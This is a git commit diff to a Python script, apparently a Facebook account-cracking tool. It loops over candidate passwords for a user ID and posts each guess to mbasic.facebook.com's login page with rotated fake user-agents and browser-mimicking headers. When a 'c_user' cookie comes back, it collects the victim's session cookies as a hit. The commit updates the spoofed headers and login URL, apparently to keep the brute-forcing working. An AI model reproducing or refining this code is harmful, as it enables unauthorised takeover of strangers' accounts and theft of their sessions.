5313a81f672eaa9594c73f9fb90e3548f1cd3dce
Ahsanali3342 <136950937+Ahsanali3342@users.noreply.github.com>
2023-06-18 17:18:18 +0500

    Update X.py

--- X.py
+++ X.py
@@ -127,12 +127,12 @@ def jalan(z):
 logo = """
 
 
-\033[1;36m░█████╗░██╗░░██╗░██████╗░█████╗░███╗░░██╗
-\033[1;36m██╔══██╗██║░░██║██╔════╝██╔══██╗████╗░██║
-\033[1;36m███████║███████║╚█████╗░███████║██╔██╗██║
-\033[1;36m██╔══██║██╔══██║░╚═══██╗██╔══██║██║╚████║
-\033[1;36m██║░░██║██║░░██║██████╔╝██║░░██║██║░╚███║
-\033[1;36m╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝"""""      
+\033[1;35m░█████╗░██╗░░██╗░██████╗░█████╗░███╗░░██╗
+\033[1;35m██╔══██╗██║░░██║██╔════╝██╔══██╗████╗░██║
+\033[1;35m███████║███████║╚█████╗░███████║██╔██╗██║
+\033[1;35m██╔══██║██╔══██║░╚═══██╗██╔══██║██║╚████║
+\033[1;35m██║░░██║██║░░██║██████╔╝██║░░██║██║░╚███║
+\033[1;35m╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝"""""      
                                                                 
 
 def main():
@@ -178,7 +178,7 @@ def rcrack(uid,pwx,tl):
 	global agents
 	try:
 		for ps in pwx:
-			agents = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.1','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5628.199 Safari/537.36','Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/112.0.5644.208 Chrome/112.0.5644.208 Safari/537.36','Mozilla/5.0 (Linux; Android 11; MBOX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5659.206 Mobile Safari/537.36','Mozilla/5.0 (Android; Tablet; rv:122.0) Gecko/122.0 Firefox/122.0','Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/600.7.20 (KHTML, like Gecko) Version/10.0.94 Mobile/06AD7A Safari/623.28','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5615.203 Safari/537.36','Mozilla/5.0 (Android 10; Tablet; rv:117.0esr) Gecko/117.0esr Firefox/117.0esr','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_14) AppleWebKit/629.16 (KHTML, like Gecko) Version/12.3.22 Safari/629.16','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20010101 Firefox/121.0','Mozilla/5.0 (X11; U; Linux x86_64; en-GB) Gecko/20071104 Firefox/115.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5618.212 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5651.198 Safari/537.36 Edg/112.0.1712.33','Mozilla/5.0 (X11; Linux x86_64; rv:118.0) Gecko/20070419 Firefox/118.0','Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5619.212 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0) AppleWebKit/630.24 (KHTML, like Gecko) Version/13.6.63 Safari/630.24','Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5625.214 Safari/537.36 Edg/111.0.1699.57','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5628.199 Safari/537.36 Edg/112.0.1698.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5660.226 Safari/537.36 OPR/97.0.3522.56','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5627.209 Safari/537.36']
+			agents = ['Mozilla/5.0 (Linux; Android 9; Infinix X650C Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.162 Mobile Safari/537.36 PHX/4.5','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.1','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5628.199 Safari/537.36','Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/112.0.5644.208 Chrome/112.0.5644.208 Safari/537.36','Mozilla/5.0 (Linux; Android 11; MBOX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5659.206 Mobile Safari/537.36','Mozilla/5.0 (Android; Tablet; rv:122.0) Gecko/122.0 Firefox/122.0','Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/600.7.20 (KHTML, like Gecko) Version/10.0.94 Mobile/06AD7A Safari/623.28','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5615.203 Safari/537.36','Mozilla/5.0 (Android 10; Tablet; rv:117.0esr) Gecko/117.0esr Firefox/117.0esr','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_14) AppleWebKit/629.16 (KHTML, like Gecko) Version/12.3.22 Safari/629.16','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20010101 Firefox/121.0','Mozilla/5.0 (X11; U; Linux x86_64; en-GB) Gecko/20071104 Firefox/115.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5618.212 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5651.198 Safari/537.36 Edg/112.0.1712.33','Mozilla/5.0 (X11; Linux x86_64; rv:118.0) Gecko/20070419 Firefox/118.0','Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5619.212 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0) AppleWebKit/630.24 (KHTML, like Gecko) Version/13.6.63 Safari/630.24','Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5625.214 Safari/537.36 Edg/111.0.1699.57','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5628.199 Safari/537.36 Edg/112.0.1698.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5660.226 Safari/537.36 OPR/97.0.3522.56','Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5627.209 Safari/537.36']
 			session = requests.Session()
 			sys.stdout.write('\r\33[1;92m[AHSAN-%s] \33[1;90m[OK:\33[1;92m%s\33[1;90m]'%(loop,len(oks))),
 			sys.stdout.flush()
@@ -194,22 +194,25 @@ def rcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {"authority": 'mbasic.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Google Chrome";v="101", "Not)A;Brand";v="99", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro}
-			lo = session.get('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			header_freefb = {'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'referer': 'https://www.google.com/',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="112", "Google Chrome";v="112"',
+    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="112.0.5671.226", "Google Chrome";v="112.0.5671.226"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"macOS"',
+    'sec-ch-ua-platform-version': '""',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'cross-site',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5671.226 Safari/537.36',
+    'viewport-width': '980',}
+			lo = session.get('https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2Fhome.php&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
